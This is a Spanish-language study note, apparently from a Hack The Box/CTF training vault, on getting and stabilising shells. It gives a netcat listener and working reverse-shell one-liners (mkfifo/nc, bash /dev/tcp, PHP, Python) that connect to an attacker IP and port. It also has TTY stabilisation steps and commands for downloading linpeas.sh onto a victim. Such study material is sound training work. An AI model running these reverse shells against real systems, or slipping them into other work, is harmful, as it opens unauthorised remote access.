

> [!info] Relacionado con
> [[Metodología de Explotación]] · [[Escalada de Privilegios]] · [[Prácticas CTF - HTB y VulnHub]]

---

## ① Tipos de shell

| Tipo | Descripción |
|------|------------|
| **Web shell** | Fichero PHP subido al servidor, se ejecuta desde el navegador |
| **Reverse shell** | El servidor se conecta de vuelta a tu máquina |
| **Bind shell** | El servidor abre un puerto al que te conectas |

> [!important] REVERSE SHELL
> Es la forma más habitual de conseguir shell. La víctima inicia la conexión hacia ti.

---

## ② Listener (siempre primero)

```bash
nc -lvnp 4444 # Puerto ALTO. Los bajos no van.
```

---

## ③ Reverse shells comunes

### Netcat / mkfifo (la que "casi siempre funciona")

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```

### Bash

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

### PHP

```bash
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

> [!tip] REVSHELLS.COM
> No memorices payloads. Usa **revshells.com** para generarlos con tu IP y puerto.

> [!warning] SI NO FUNCIONA
> Prueba otra. No todas funcionan en toda máquina (depende de lo instalado y del firewall).

---

## ④ Estabilización de la TTY

**Receta completa (memorizar):**

```bash
# 1) Spawnear PTY con Python (python3)
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2) Suspender la shell (Ctrl+Z)

# 3) En tu Kali: terminal en crudo + traer la shell
stty raw -echo; fg

# 4) Reparar pantalla
reset
export TERM=xterm # o xterm-256color
```

> [!important] QUÉ HACE CADA PASO
> - `pty.spawn` crea una pseudoterminal → shell más decente
> - `Ctrl+Z` la **suspende** (no la mata) y vuelve a tu Kali
> - `stty raw -echo` pone tu terminal en crudo y quita el doble eco
> - `reset` limpia la pantalla rota
> - `export TERM=xterm` permite que vi, clear, top funcionen

---

## ⑤ Transferencia de archivos

```bash
# En tu Kali: servidor HTTP
python3 -m http.server 8000

# En la víctima
curl http://10.10.14.185:8000/linpeas.sh -o linpeas.sh
# o
wget http://10.10.14.185:8000/linpeas.sh
```

### Alternativas

- Subir por `/uploads` de la web
- Por FTP si está disponible
- Con SCP si tenemos SSH
- `parsing_peas` (automatiza descarga + ejecución + resultado en HTML)

---

## ⑥ Detección de reverse shells en tráfico

En una captura de red, una ráfaga de **HTTP que de repente cambia a TCP** es una señal típica de reverse shell.

> [!info] WAF
> Una vez dentro del servidor, el **WAF ya no protege**. Actúa a nivel de aplicación; dentro solo queda el firewall del sistema.

---

## ⑦ Chuleta rápida

| Acción | Comando principal | Alternativa |
|--------|------------------|------------|
| Reverse shell | `rm -f /tmp/f;mkfifo...` | revshells.com |
| Listener | `nc -lvnp 4444` | `pwncat-cs -lp 4444` |
| Estabilizar | `python3 -c 'import pty;pty.spawn(...)'` | `script -qc /bin/bash /dev/null` |
| Ver privilegios | `sudo -l` | `id`, `LinPEAS` |
| Servir archivo | `python3 -m http.server 8000` | `php -S 0.0.0.0:8000` |
| Descargar | `curl http://IP:8000/f -o f` | `wget` |
| Localizar flag | `find / -name user.txt 2>/dev/null` | Mirar `/home/<user>/` |

---

## Checklist de repaso

- [ ] ¿Sé montar una reverse shell con listener?
- [ ] ¿Memorizo la secuencia de estabilización TTY?
- [ ] ¿Sé transferir archivos con http.server + curl/wget?
- [ ] ¿Entiendo la transición HTTP → TCP en una reverse shell?
- [ ] ¿Sé cuándo usar revshells.com en lugar de memorizar payloads?

---

## Enlaces relacionados

- [[comandos/Metasploit]] — Cheat sheet de comandos
- [[comandos/Hydra]] — Cheat sheet de comandos
- [[comandos/SQLMap]] — Cheat sheet de comandos


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Andres/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — Metasploit, SQL Injection, SQLMap
- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Metasploit, SQL Injection, SQLMap
- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Metasploit, SQL Injection, SQLMap
- [[../../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Metasploit, Netcat / Reverse Shells, SQL Injection
- [[../../transcripciones/Junio/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — Hydra, SQL Injection, SQLMap
- [[../../apuntes Chema/Maquinas/Vaccine (Tier 2) — Repaso en profundidad.md|Vaccine (Tier 2) — Repaso en profundidad]] — Hydra, SQL Injection, SQLMap

### 🛠️ Herramientas

- [[comandos/Hydra|Hydra]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/SQLMap|SQLMap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]

> #escalada-privilegios #hack-the-box #hydra #kali #linux #metasploit #netcat #pentest #redes #reverse-shell #sqli #sqlmap #ssh #vulnhub
